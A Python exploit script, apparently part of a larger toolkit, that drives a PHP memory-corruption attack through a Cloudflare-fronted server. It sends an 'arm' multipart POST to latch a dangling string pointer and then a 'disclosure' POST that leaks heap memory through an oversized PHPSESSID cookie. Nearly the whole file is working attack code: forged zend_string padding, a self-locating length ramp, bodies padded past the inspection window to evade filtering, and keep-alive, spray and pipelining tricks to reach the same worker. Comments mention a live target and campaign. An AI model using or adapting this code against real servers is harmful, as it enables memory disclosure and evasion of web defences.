#!/usr/bin/env python3
"""Same-child landing probe for the multiplexed front (E3).

The latched state lives in *one* prefork child, so the arm and its disclosure
must be served by that child. Two POST-only strategies are measured here:

``pin``      arm and disclose on **one keep-alive connection** (one child for
             as long as the origin keeps the connection), then a fresh
             connection for the next pair.
``spread``   every request on a fresh connection (the live campaign's shape),
             to measure how often a pair lands by luck.

Both are POST /php/*, padded past the inspection window, and paced. The
disclosure is the published 0x1000 probe (fillers configurable), so a landed
pair shows a 4096-byte ``Set-Cookie`` payload instead of the 32-byte generated
session id.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import socket
import ssl
import struct
import sys
import time
import urllib.parse

sys.path.insert(0, os.environ.get("P2S_TOOL", "/root/chainetool-v106/e2e"))
from p2s import transplant  # noqa: E402

ARM_ORIG = transplant._arm_parts
PAD_HEAD = b'Content-Disposition: form-data; name="pad"\r\n\r\n'


def arm_body(lines: int, boundary: bytes) -> bytes:
    """The published arm (1001 pads, carriers, bomb last) — file order."""
    return transplant._parts_to_body(ARM_ORIG(lines), boundary)


def disclose_body(window: int, arrays: int, fillers: int, boundary: bytes) -> bytes:
    return transplant._parts_to_body(
        transplant._disclosure_parts(window, arrays, fillers), boundary)


def pad(body: bytes, boundary: bytes, size: int, forge: int = 0) -> bytes:
    """Prefix the inert field that carries the literal past the inspection cut.

    ``forge`` turns the pad value into a **second forged zend_string**: it is
    filled with the 8-byte little-endian ``window`` repeated, so wherever a
    dangling string pointer lands inside the pad, the length read at ``+0x10``
    is our window and the session-cookie encode discloses the heap around it.
    Measured on the live target (2026-10-28): the latched pointer landed in the
    pad's 'z' run and PHP died on ``3 * 0x7a7a7a7a7a7a7a7a + 32`` — a pad
    capture, not a miss. With ``forge`` that same capture is a 0x1000/0x20000
    byte disclosure.
    """
    if not size or size <= 0:
        return body
    head = (b"--" + boundary + b"\r\n" + PAD_HEAD)
    length = max(0, size - len(head) - 2)
    if forge:
        value = (struct.pack("<Q", forge) * (length // 8 + 1))[:length]
    else:
        value = b"z" * length
    return head + value + b"\r\n" + body


def pad_ramp(body: bytes, boundary: bytes, size: int, overlay: int = 0x4000,
             name: str = "pad") -> bytes:
    """Pad whose length field is position dependent (the S0 ramp).

    A pad capture reads ``len`` at ``P+0x10`` and data at ``P+0x18`` where P is
    the dangling pointer, i.e. some offset ``i`` inside the pad *value*. A
    constant window can only ever disclose our own bytes: the read ends inside
    the pad. Writing ``L(j) = pad_value_len - j + overlay`` at every 8-aligned
    value offset ``j`` makes any landing whose length field sits at ``j`` read
    from ``i+0x18`` for ``L`` bytes, i.e. end at ``pad_end + overlay + 8``:

    * the tail of the cookie is **real heap**, the first address-bearing read a
      pad capture can produce;
    * the captured length is **self-locating**:
      ``i = pad_value_len - len + overlay - 0x10``.

    A landing is therefore useful even when its ``i`` is unknown: the length it
    returns names the slot.
    """
    if not size or size <= 0:
        return body
    head = (b"--" + boundary + b"\r\n"
            + b'Content-Disposition: form-data; name="' + name.encode()
            + b'"\r\n\r\n')
    length = max(0, size - len(head) - 2)
    value = bytearray(length)
    for j in range(0, max(0, length - 8), 8):
        word = (length - j + int(overlay)) & 0xFFFFFFFFFFFFFFFF
        struct.pack_into("<Q", value, j, word)
    return head + bytes(value) + b"\r\n" + body


def _recv(sock, buffer: bytes) -> bytes:
    chunk = sock.recv(65536)
    if not chunk:
        raise EOFError("connection closed")
    return buffer + chunk


def read_response(sock, buffer: bytes = b"") -> tuple[bytes, bytes, bytes]:
    """Read one HTTP/1.1 response (content-length or chunked) off ``sock``.

    Cloudflare answers these POSTs chunked, so the framing has to be consumed
    exactly: any bytes left over belong to the next response on a keep-alive
    connection.
    """
    while b"\r\n\r\n" not in buffer:
        buffer = _recv(sock, buffer)
    header, _, rest = buffer.partition(b"\r\n\r\n")
    length = None
    chunked = False
    for line in header.split(b"\r\n")[1:]:
        name, _, value = line.partition(b":")
        name = name.strip().lower()
        if name == b"content-length":
            length = int(value.strip())
        if name == b"transfer-encoding" and b"chunked" in value.lower():
            chunked = True
    body = b""
    if chunked:
        while True:
            while b"\r\n" not in rest:
                rest = _recv(sock, rest)
            line, _, rest = rest.partition(b"\r\n")
            size = int(line.split(b";")[0] or b"0", 16)
            if size == 0:
                while not rest.startswith(b"\r\n"):
                    if b"\r\n" in rest:
                        _, _, rest = rest.partition(b"\r\n")
                    else:
                        rest = _recv(sock, rest)
                rest = rest[2:]
                break
            while len(rest) < size + 2:
                rest = _recv(sock, rest)
            body += rest[:size]
            rest = rest[size + 2:]
    elif length is not None:
        while len(rest) < length:
            rest = _recv(sock, rest)
        body = rest[:length]
        rest = rest[length:]
    return header, body, rest


def cookie_payload(header: bytes) -> bytes:
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n;]*?)(?:;|$)", header)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1))


def open_sock(host, port, tls, timeout=180.0) -> socket.socket:
    sock = socket.create_connection((host, port), timeout)
    if tls:
        context = ssl.create_default_context()
        sock = context.wrap_socket(sock, server_hostname=host)
    sock.settimeout(timeout)
    return sock


def pair(args, *, keepalive: bool, sock=None):
    boundary = b"S" * 17
    disc_boundary = b"B" * 10
    head = (
        f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
        "Content-Type: multipart/form-data; boundary=" + boundary.decode() + "\r\n"
    ).encode()
    arm = pad(arm_body(args.lines, boundary), boundary, args.pad_size,
              forge=args.pad_forge)
    disc = pad(disclose_body(args.window, 0, args.fillers, disc_boundary),
               disc_boundary, args.pad_size, forge=args.pad_forge)
    connection = "keep-alive" if keepalive else "close"
    socks = []
    def open_one():
        if sock is not None:
            return sock, False
        fresh = open_sock(args.host, args.port, args.tls)
        socks.append(fresh)
        return fresh, True
    leftover = b""
    try:
        arm_sock, _ = open_one()
        arm_head = head + f"Content-Length: {len(arm)}\r\nConnection: {connection}\r\n\r\n".encode()
        arm_sock.sendall(arm_head + arm)
        arm_header, arm_resp, leftover = read_response(arm_sock, b"")
        # the request was already sent as one write

        disc_head = (
            f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            "Content-Type: multipart/form-data; boundary=" + disc_boundary.decode() +
            f"\r\nContent-Length: {len(disc)}\r\nConnection: {connection}\r\n\r\n"
        ).encode()
        if keepalive:
            disc_sock = arm_sock
        else:
            disc_sock, _ = open_one()
            leftover = b""
        disc_sock.sendall(disc_head + disc)
        disc_header, disc_resp, leftover = read_response(disc_sock, leftover)
        arm_status = arm_header.split(b"\r\n", 1)[0].decode("latin1")
        disc_status = disc_header.split(b"\r\n", 1)[0].decode("latin1")
        payload = cookie_payload(disc_header)
        _arm_body_seen = arm_header + b"" if False else b""
        return {
            "arm_status": arm_status,
            "disc_status": disc_status,
            "arm_oom": b"Allowed memory size" in arm_resp,
            "arm_body_head": arm_resp[:120].decode("latin1"),
            "cookie_len": len(payload),
            "disc_body_len": len(disc_resp),
            "disc_body_head": disc_resp[:300].decode("latin1"),
            "disc_header_head": disc_header[:200].decode("latin1"),
            "cookie_head": payload[:16].hex(),
            "vindex": (struct.unpack(">H", payload[1:3])[0]
                       if payload[:1] == b"v" and payload[3:4] == b"x" else None),
        }
    finally:
        for item in socks:
            item.close()


def latch_spray(args) -> dict:
    """One arm, then K disclosures on fresh connections (latch spray).

    A failed disclosure served by a *different* child does not consume the
    latched state, so with a pool of N children roughly 1-(1-1/N)^K of the
    sprays meet the armed child. Cheap: one arm, K probe-sized disclosures.
    """
    rows = []
    boundary = b"S" * 17
    arm = pad(arm_body(args.lines, boundary), boundary, args.pad_size,
              forge=args.pad_forge)
    arm_head = (
        f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
        "Content-Type: multipart/form-data; boundary=" + boundary.decode() +
        f"\r\nContent-Length: {len(arm)}\r\nConnection: close\r\n\r\n"
    ).encode()
    # Multi-arm: every arm can latch a *different* child, so K arms turn the
    # disclosure lottery from 1/N into min(K,N)/N of the pool being latched.
    arms = []
    for arm_index in range(1, args.arms + 1):
        arm_row = {"attempts": []}
        for arm_try in range(1, args.arm_retries + 1):
            try:
                sock = open_sock(args.host, args.port, args.tls,
                                 timeout=args.arm_timeout)
                sock.sendall(arm_head + arm)
                header, body, _ = read_response(sock, b"")
                arm_row = {"arm_status": header.split(b"\r\n", 1)[0].decode("latin1"),
                           "arm_oom": b"Allowed memory size" in body,
                           "attempt": arm_try}
                sock.close()
                break
            except (OSError, EOFError) as exc:
                arm_row = {"error": repr(exc), "attempt": arm_try}
                print(json.dumps({"arm_try": arm_try, "error": repr(exc)}))
                try:
                    sock.close()
                except Exception:
                    pass
                time.sleep(args.pacing)
        arms.append(arm_row)
        print(json.dumps({"arm_index": arm_index, **arm_row}))
        if args.pacing:
            time.sleep(args.pacing)
    if all(row.get("error") for row in arms):
        return {"arms": arms, "rows": [], "landed": 0}
    time.sleep(args.pacing)
    for index in range(args.pairs):
        disc_boundary = b"B" * 10
        disc = pad(disclose_body(args.window, 0, args.fillers, disc_boundary),
                   disc_boundary, args.pad_size, forge=args.pad_forge)
        head = (
            f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            "Content-Type: multipart/form-data; boundary=" + disc_boundary.decode() +
            f"\r\nContent-Length: {len(disc)}\r\nConnection: close\r\n\r\n"
        ).encode()
        row = {"index": index}
        try:
            sock = open_sock(args.host, args.port, args.tls)
            sock.sendall(head + disc)
            header, body, _ = read_response(sock, b"")
            payload = cookie_payload(header)
            row.update({
                "status": header.split(b"\r\n", 1)[0].decode("latin1"),
                "cookie_len": len(payload),
                "cookie_head": payload[:16].hex(),
                "vindex": (struct.unpack(">H", payload[1:3])[0]
                           if payload[:1] == b"v" and payload[3:4] == b"x" else None),
                "body_len": len(body),
                "body_head": body[:120].decode("latin1"),
            })
            sock.close()
        except (OSError, EOFError) as exc:
            row.update({"error": repr(exc)})
        rows.append(row)
        print(json.dumps(row))
        if args.pacing:
            time.sleep(args.pacing)
    landed = sum(1 for row in rows if row.get("cookie_len", 0) > 32)
    return {"arms": arms, "rows": rows, "landed": landed}


def pipeline(args) -> dict:
    """Arm and disclosure written in one TCP segment (HTTP/1.1 pipelining).

    A pipelining edge forwards both requests on the *same* upstream connection,
    which is the one shape that could carry child affinity through a front that
    reopens per request. Cost: two responses per connection.
    """
    rows = []
    for index in range(args.pairs):
        arm_boundary = b"S" * 17
        disc_boundary = b"B" * 10
        arm = pad(arm_body(args.lines, arm_boundary), arm_boundary,
                  args.pad_size, forge=args.pad_forge)
        disc = pad(disclose_body(args.window, 0, args.fillers, disc_boundary),
                   disc_boundary, args.pad_size, forge=args.pad_forge)
        head = (
            f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            "Content-Type: multipart/form-data; boundary=" + arm_boundary.decode() +
            f"\r\nContent-Length: {len(arm)}\r\nConnection: keep-alive\r\n\r\n"
        ).encode() + arm + (
            f"POST {args.path} HTTP/1.1\r\nHost: {args.host}\r\n"
            "Content-Type: multipart/form-data; boundary=" + disc_boundary.decode() +
            f"\r\nContent-Length: {len(disc)}\r\nConnection: keep-alive\r\n\r\n"
        ).encode() + disc
        row = {"index": index}
        sock = None
        try:
            sock = open_sock(args.host, args.port, args.tls, timeout=args.arm_timeout)
            sock.sendall(head)
            arm_header, arm_body_resp, rest = read_response(sock, b"")
            row["arm_oom"] = b"Allowed memory size" in arm_body_resp
            disc_header, disc_body_resp, rest = read_response(sock, rest)
            payload = cookie_payload(disc_header)
            row.update({
                "status": disc_header.split(b"\r\n", 1)[0].decode("latin1"),
                "cookie_len": len(payload),
                "cookie_head": payload[:16].hex(),
                "vindex": (struct.unpack(">H", payload[1:3])[0]
                           if payload[:1] == b"v" and payload[3:4] == b"x" else None),
                "body_len": len(disc_body_resp),
                "body_head": disc_body_resp[:160].decode("latin1", "replace"),
            })
        except (OSError, EOFError) as exc:
            row["error"] = repr(exc)
        finally:
            try:
                if sock is not None:
                    sock.close()
            except OSError:
                pass
        rows.append(row)
        print(json.dumps({k: row[k] for k in row if k != "body_head"}))
        time.sleep(args.pacing)
    landed = sum(1 for row in rows if row.get("cookie_len", 0) > 32)
    return {"rows": rows, "landed": landed}


def main(argv):
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=19180)
    parser.add_argument("--path", default="/php/index.php")
    parser.add_argument("--tls", action="store_true")
    parser.add_argument("--lines", type=int, default=470000)
    parser.add_argument("--window", type=lambda v: int(v, 0), default=0x1000)
    parser.add_argument("--fillers", type=int, default=841)
    parser.add_argument("--pad-size", type=int, default=(1 << 20) + 8192)
    parser.add_argument("--pad-forge", type=lambda v: int(v, 0), default=0,
                        help="fill the pad with this window (a second forged "
                             "zend_string, for the padded arena)")
    parser.add_argument("--pairs", type=int, default=8)
    parser.add_argument("--mode", choices=("pin", "spread", "latch", "pipeline"),
                        default="pin")
    parser.add_argument("--pacing", type=float, default=0.5)
    parser.add_argument("--arm-retries", type=int, default=3)
    parser.add_argument("--arms", type=int, default=1,
                        help="latches spread over this many arms (one per child)")
    parser.add_argument("--arm-timeout", type=float, default=60.0)
    parser.add_argument("--out", default="/root/cfctf-mirror/out/pin.json")
    args = parser.parse_args(argv)
    if args.mode == "pipeline":
        document = pipeline(args)
        document["config"] = vars(args)
        with open(args.out, "w", encoding="utf-8") as handle:
            json.dump(document, handle, indent=2)
        print(f"landed {document['landed']}/{args.pairs} -> {args.out}")
        return 0
    if args.mode == "latch":
        document = latch_spray(args)
        document["config"] = vars(args)
        with open(args.out, "w", encoding="utf-8") as handle:
            json.dump(document, handle, indent=2)
        print(f"landed {document.get('landed')}/{args.pairs} -> {args.out}")
        return 0
    rows = []
    if args.mode == "pin":
        for index in range(args.pairs):
            row = pair(args, keepalive=True)
            rows.append(row)
            print(json.dumps(row))
            time.sleep(args.pacing)
    else:
        for index in range(args.pairs):
            row = pair(args, keepalive=False)
            rows.append(row)
            print(json.dumps(row))
            time.sleep(args.pacing)
    landed = sum(1 for row in rows if row["cookie_len"] not in (0, 32))
    document = {"mode": args.mode, "pairs": args.pairs, "landed": landed,
                "rows": rows, "config": vars(args)}
    with open(args.out, "w", encoding="utf-8") as handle:
        json.dump(document, handle, indent=2)
    print(f"landed {landed}/{args.pairs} -> {args.out}")
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
